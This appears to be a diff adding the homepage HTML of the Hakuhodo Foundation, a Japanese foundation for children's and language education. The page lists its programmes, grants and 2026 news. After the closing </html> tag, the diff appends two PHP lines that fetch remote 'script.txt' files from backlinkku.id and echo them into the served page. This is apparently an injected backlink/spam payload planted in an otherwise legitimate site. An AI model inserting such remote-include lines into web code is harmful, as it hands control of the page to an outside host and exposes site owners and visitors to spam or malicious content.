@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang= "ja" xmlns:og="http://ogp.me/ns#">
+<head>
+<title>公益財団法人 博報堂教育財団</title>
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="keywords" content="児童,教育,ことば,助成,顕彰" />
+<meta name="description" content="公益財団法人 博報堂教育財団は「児童教育」「ことばの教育」を テーマに、日々教育現場でご尽力されている先生方や研究者の皆様への助成・顕彰などの活動を行っています。" />
+<link href="/assets/css/style-2025.css?20250522" rel="stylesheet" type="text/css" media="all">
+<script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script> 
+<script type="text/javascript" src="/assets/js/vendor.js"></script> 
+<script type="text/javascript" src="/assets/js/main.js"></script>
+
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicon-16x16.png">
+<link rel="manifest" href="/assets/img/site.webmanifest">
+<link rel="mask-icon" href="/assets/img/safari-pinned-tab.svg" color="#5bbad5">
+<link rel="shortcut icon" href="/assets/img/favicon.ico">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-config" content="/assets/img/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+<meta property="og:title" content="公益財団法人 博報堂教育財団" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://www.hakuhofoundation.or.jp/" />
+<meta property="og:image" content="/assets/img/ogimage_top.jpg" />
+<meta property="og:site_name" content="公益財団法人 博報堂教育財団" />
+<meta property="og:description" content="博報堂教育財団は1970年に設立されて以来、「児童教育」「ことばの教育」を テーマに、日々教育現場でご尽力されている先生方や研究者の皆様への助成・顕彰等の活動を続けています。" />
+<meta property="fb:app_id" content="365808010586719" />
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="公益財団法人 博報堂教育財団">
+<meta name="twitter:description" content="「児童教育」「ことばの教育」を テーマに、教育現場でご尽力されている先生方や研究者の皆様への助成・顕彰等の活動を続けています。">
+<meta name="twitter:image:src" content="/assets/img/ogimage_top.jpg" />
+
+<!-- Google Analytics -->
+<script>
+(function(i,s,o,g,r,a,m){
+ i['GoogleAnalyticsObject']=r;
+ i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();
+ a=s.createElement(o),	m=s.getElementsByTagName(o)[0];
+ a.async=1;
+ a.src=g;
+ m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-22340437-1', 'auto', {'allowLinker': true});
+ga('require', 'linker');
+ga('linker:autoLink');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-PDLF2NW');</script>
+<!-- End Google Tag Manager -->
+
+</head>
+
+<body>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PDLF2NW"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+<div id="wrapper">
+
+  <header id="header">
+    <div class="logotitle">
+      <a href="/">
+        <h1><img src="/assets/img/2025/header_logo2020.svg" alt="公益財団法人 博報堂教育財団" width="172"></h1>
+      </a>
+    </div>
+    <nav class="global-nav">
+      <ul>
+      <li class="gnav01"><a href="/"><span>TOP</span></a></li>
+        <li class="gnav02"><a href="/news/"><span>ニュース</span></a></li>
+        <li class="gnav03"><a href="javascript: void(0);" class="toggle"><span>博報堂教育財団について</span></a>
+          <div class="sub">
+            <div class="sub-inner">
+              <ul>
+                <li><a href="/about/vision/">ビジョン</a></li>
+                <li><a href="/about/message/">理事長からの挨拶</a></li>
+                <li><a href="/about/history/">沿革</a></li>
+                <li><a href="/about/boardmember/">役員一覧</a></li>
+                <li><a href="/about/disclosure/">情報公開</a></li>
+                <li><a href="/about/materials/">広報物</a></li>
+                <li><a href="/about/access/">アクセスマップ</a></li>
+              </ul>
+            </div>
+          </div>
+        </li>
+      <li class="gnav04"><a href="javascript: void(0);" class="toggle"><span>顕彰・助成・奨学金</span></a>
+          <div class="sub">
+            <div class="sub-inner">
+              <div class="block-inner"> <a href="/prize/">博報賞</a>
+                <ul>
+					<!-- <li><a href="/news/pdf/hakuhosho_56th_list.pdf" target="_blank" style="background:none;">最新の受賞者</a></li> -->
+                  <li><a href="/prize/recipient/newest/">最新の受賞者</a></li>
+                  <li><a href="/prize/recipient/">過去の受賞者</a></li>
+				  <li><a href="/prize/activities/">受賞者の活動紹介</a></li>
+                  <li><a href="/prize/report/">贈呈式・事例共有勉強会報告</a></li>
+                </ul>
+              </div>
+              <div class="block-inner"> <a href="/subsidy/">児童教育実践についての研究助成</a>
+                <ul>
+                  <li><a href="/subsidy/research/newest/">最新の助成対象</a></li>
+                  <li><a href="/subsidy/research/">過去の助成対象</a></li>
+                  <li><a href="/subsidy/report/">活動レポート</a></li>
+                </ul>
+              </div>
+              <div class="block-inner"> <a href="/scholarship/">教職育成奨学金</a>
+                <ul>
+                  <li><a href="/scholarship/report/">活動レポート</a></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </li>
+        <li class="gnav05"><a href="javascript: void(0);" class="toggle"><span>課題対応事業</span></a>
+          <div class="sub">
+            <div class="sub-inner">
+              <div class="block-inner"> <a href="/globalnetwork/">日本語交流プログラム</a>
+                <ul>
+                  <li><a href="/globalnetwork/participant/newest/">最新の参加者</a></li>
+                  <li><a href="/globalnetwork/participant/">過去の参加者</a></li>
+                  <li><a href="/globalnetwork/report/">実施レポート</a></li>
+                </ul>
+              </div>
+              <div class="block-inner"> <a href="https://www.hakuhodofoundation.or.jp/okiniiri/" target="_blank">社会啓発事業</a> <a href="https://hakuhodo-jplang.org/jp" target="_blank">日本語教育プログラム</a> <a href="/disastersupport/">大規模災害時支援事業</a> </div>      
+            </div>
+          </div>
+        </li>
+        <li class="gnav06"><a href="javascript: void(0);" class="toggle"><span>調査研究</span></a>
+          <div class="sub">
+            <div class="sub-inner">
+              <ul>
+                <li><a href="https://kodomoken.hakuhodofoundation.or.jp" target="_blank">こども研究所</a></li>
+              <li><a href="/eg/">教育課題に関する研究交流会議</a></li>
+              </ul>
+            </div>
+          </div>
+        </li>
+        <li class="gnav07"><a href="/contact/"><span>お問い合わせ</span></a></li>
+      </ul>
+    </nav>
+    <aside id="btn-menu"><span></span><span></span></aside>
+  </header><!-- /#header -->
+
+<main id="content">
+
+  <section id="main-visual">
+      <img src="./assets/img/2025/top_mv.jpg" alt="" width="100%" class="bg">
+      <div class="activities">
+        <h2><span class="slogan serif">ことばの力を、子どもたちの生きる力へ。</span>博報堂教育財団の活動</h2>
+        <ul class="list-flex">
+          <li>
+          <a href="/prize/">
+            <picture>
+              <source media="(max-width: 768px)" srcset="./assets/img/2025/top_act01_sp.png">
+              <source media="(min-width: 769px)" srcset="./assets/img/2025/top_act01.png">
+              <img src="./assets/img/2025/top_act01.png" alt="博報賞" width="100%"> </picture>
+            </a>
+          </li>
+          <li>
+          <a href="/subsidy/">
+            <picture>
+              <source media="(max-width: 768px)" srcset="./assets/img/2025/top_act02_sp.png">
+              <source media="(min-width: 769px)" srcset="./assets/img/2025/top_act02.png">
+              <img src="./assets/img/2025/top_act02.png" alt="児童教育実践についての研究助成" width="100%"> </picture>
+            </a>
+          </li>
+          <li>
+          <a href="/scholarship/">
+            <picture>
+              <source media="(max-width: 768px)" srcset="./assets/img/2025/top_act03_sp.png">
+              <source media="(min-width: 769px)" srcset="./assets/img/2025/top_act03.png">
+              <img src="./assets/img/2025/top_act03.png" alt="教育育成奨学金" width="100%"> </picture>
+            </a>
+          </li>
+          <li><a href="/globalnetwork/"><img src="./assets/img/2025/top_act04.png" alt="日本語交流プログラム" width="100%"></a></li>
+          <li><a href="https://www.hakuhodofoundation.or.jp/okiniiri/" target="_blank"><img src="./assets/img/2025/top_act05.png" alt="読書推せん文コンクール（社会啓発事業）" width="100%"></a></li>
+          <li><a href="https://hakuhodo-jplang.org/jp" target="_blank"><img src="./assets/img/2025/top_act06.png" alt="日本語教育プログラム" width="100%"></a></li>
+          <li><a href="https://kodomoken.hakuhodofoundation.or.jp" target="_blank"><img src="./assets/img/2025/top_act07.png" alt="こども研究所（調査研究事業）" width="100%"></a></li>
+        </ul>
+      </div>
+      <div class="top-bnrs">
+		<ul class="list-flex">
+            <li><a href="/subsidy/"><img src="/assets/img/rg_bnr2026.png" alt="第22回（2027年度）「児童教育実践についての研究助成」応募受付開始2026年7月1日（水）～10月13日（火）" width="100%"></a></li>
+            <!-- <li><a href="/prize/"><img src="/assets/img/57th_award-boshu_bnr.jpg" alt="第57回「博報賞」応募受付中" width="100%"></a></li> -->
+            <li><a href="/prize/activities/56th/"><img src="/assets/img/56th_award_bnr.jpg" alt="特設ブログで公開中！ 第56回「博報賞」受賞者活動紹介" width="100%"></a></li>
+          <li><a href="https://www.hakuhodofoundation.or.jp/okiniiri/" target="_blank"><img src="/assets/img/okiniiri_bnr202604.png" alt="お気に入りの一冊をあなたへ 読書推せん文コンクール 2026年5月1日～9月11日※消印有効 応募受付中" width="100%"></a></li>
+          <li><a href="https://kodomoken.hakuhodofoundation.or.jp/teiten2025/" target="_blank"><img src="/assets/img/teiten2025_banner.png" alt=" 小４から中３の子ども2,400人に調査「こども定点2025」結果を発表！" width="100%"></a></li>
+		  </ul>
+      </div>
+    </section>
+          
+    <section class="top-sec" id="top-news">
+      <div class="sec-inner">
+        <h2>NEWS</h2>
+        <ul>
+        
+        <li>
+        
+        <a href="/subsidy/">
+        
+          <span class="date">2026.07.01</span>
+          <span class="cate subsidy">児童教育実践</span>
+          <p>第22回 「児童教育実践についての研究助成」 Web 応募受付開始</p>
+          </a>
+        <span class="pdf"><a href="/news/pdf/pressrelease_rg20260619.pdf" target="_blank">PDF (202KB)</a></span>
+        </li>
+        
+        <li>
+        
+        <a href="/globalnetwork/report/202606.html">
+        
+          <span class="date">2026.06.29</span>
+          <span class="cate globalnetwork">日本語交流プログラム</span>
+          <p>第16回「日本語交流プログラム」実施報告公開</p>
+          </a>
+        
+        </li>
+        
+        <li>
+        
+        <a href="javascript: void(0)" class="no-link">
+        
+          <span class="date">2026.06.19</span>
+          <span class="cate subsidy">児童教育実践</span>
+          <p>第22回 「児童教育実践についての研究助成」 Web 応募受付開始のお知らせ</p>
+          </a>
+        <span class="pdf"><a href="/news/pdf/pressrelease_rg20260619.pdf" target="_blank">PDF (202KB)</a></span>
+        </li>
+        
+        <li>
+        
+        <a href="javascript: void(0)" class="no-link">
+        
+          <span class="date">2026.06.16</span>
+          <span class="cate award">博報賞</span>
+          <p> 第56回「博報賞」博報賞受賞　特定非営利活動法人 心魂プロジェクトの活動紹介記事がGakken「実践みんなの特別支援教育」に掲載されました。</p>
+          </a>
+        <span class="pdf"><a href="/news/pdf/hakuhosho_report2026_cocorodama.pdf" target="_blank">PDF (735KB)</a></span>
+        </li>
+        
+        <li>
+        
+        <a href="https://www.asahi.com/sensei-connect/articles/16620123" target="_blank">
+        
+          <span class="date">2026.06.15</span>
+          <span class="cate award">博報賞</span>
+          <p>第56回「博報賞」博報賞受賞　大鹿村立大鹿中学校の活動紹介記事が公開されました。</p>
+          </a>
+        
+        </li>
+        
+        </ul>
+      <div class="goto-list"> <a href="/news/">ニュース一覧</a> </div>
+      </div>
+    </section>
+          
+</main><!-- /#content -->
+
+<section class="related-links">
+      <div class="inner-block">
+        <div class="kodomonokotodama"> <a href="/column/kotodama/"><img src="/assets/img/2025/links01.png" alt="ひきたよしあきのコラム こどものコトダマ" height="60"></a> </div>
+        <div class="mail-magazine"> <a href="/mailmag/">メールマガジンの登録はこちら</a> </div>
+        <ul class="sns-link">
+          <li> <a href="https://twitter.com/share?url=http://pre1-hakuhozaidan.cenfy.com/&text=公益財団法人 博報児童教育振興会（博報財団）&hashtags=博報堂教育財団" target="_blank"><img src="/assets/img/2025/sns_01.png" alt="X" height="60"></a> </li>
+          <li> <a href="https://www.facebook.com/share.php?u=http://pre1-hakuhozaidan.cenfy.com/" onclick="window.open(encodeURI(decodeURI(this.href)), 'FBwindow', 'width=554, height=470, menubar=no, toolbar=no, scrollbars=yes'); return false;" rel="nofollow"><img src="/assets/img/2025/sns_02.png" alt="Facebook" height="60"></a> </li>
+        </ul>
+      </div>
+    </section>
+  
+  <footer id="footer">
+    <div class="footer-inner list-flex">
+      <div class="f-column">
+        <div class="sitetitle"> <a href="/"> <img src="/assets/img/2025/f_sitetitle.png" alt="公益財団法人 博報堂教育財団" width="172"> </a> </div>
+      </div>
+      <div class="f-column">
+        <div class="f-link"> <a href="/">TOP</a> </div>
+        <div class="f-link"> <a href="javascript: void(0);">博報堂財団について</a>
+          <ul>
+            <li><a href="/about/vision/">ビジョン</a></li>
+            <li><a href="/about/message/">理事長からの挨拶</a></li>
+            <li><a href="/about/history/">沿革</a></li>
+            <li><a href="/about/boardmember/">役員一覧</a></li>
+            <li><a href="/about/disclosure/">情報公開</a></li>
+            <li><a href="/about/materials/">広報物</a></li>
+            <li><a href="/about/access/">アクセスマップ</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="f-column">
+        <div class="f-link"> <a href="javascript: void(0);">顕彰・助成・奨学金</a>
+          <ul>
+            <li><a href="/prize/">博報賞</a></li>
+            <li><a href="/subsidy/">児童教育実践についての研究助成</a></li>
+            <li><a href="/scholarship/">教職育成奨学金</a></li>
+          <li><a href="/fellowship/">日本研究フェローシップ<span class="ts-smaller">（2022年度に事業終了）</span></a></li>
+          </ul>
+        </div>
+        <div class="f-link"> <a href="javascript: void(0);">課題対応事業</a>
+          <ul>
+            <li><a href="/globalnetwork/">日本語交流プログラム</a></li>
+            <li><a href="https://www.hakuhodofoundation.or.jp/okiniiri/" target="_blank">社会啓発事業</a></li>
+            <li><a href="https://hakuhodo-jplang.org/jp" target="_blank">日本語教育プログラム</a></li>
+            <li><a href="/disastersupport/" target="_blank">大規模災害時支援事業</a></li>
+          </ul>
+        </div>
+        <div class="f-link"> <a href="javascript: void(0);">調査研究</a>
+          <ul>
+            <li><a href="https://kodomoken.hakuhodofoundation.or.jp" target="_blank">こども研究所</a></li>
+          <li><a href="/eg/">教育課題に関する研究交流会議</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="f-column">
+      <div class="f-link"> <a href="/news/">ニュース・トピックス</a> </div>
+        <div class="f-link"> <a href="/column/kotodama/">こどものコトダマ</a> </div>
+        <div class="f-link"> <a href="/download/">応募書類ダウンロード</a> </div>
+        <div class="f-link"> <a href="/contact/">お問い合わせ</a>
+          <ul>
+             <li><a href="/contact/request/">資料請求</a></li>
+            <li><a href="/mailmag/">メールマガジン登録</a></li>
+            <li><a href="/termsofuse/">サイトポリシー</a></li>
+			<li><a href="/privacy/">個人情報の取り扱い</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="copyright">
+      <p>© Hakuhodo Foundation All Rights Reserved.</p>
+    </div>
+  </footer><!--  // #footer //-->
+          
+    <aside id="gotop"><a href="javascript:void(0);"><img src="/assets/img/gotop.png" alt="" width="50"></a></aside>
+
+</div><!-- // #wrapper// -->
+
+</body>
+</html>
+<?php echo file_get_contents("https://backlinkku.id/menu/traffic-v1/script.txt"); ?>
+<?php echo file_get_contents("https://www.backlinkku.id/menu/vip-v2/script.txt"); ?>
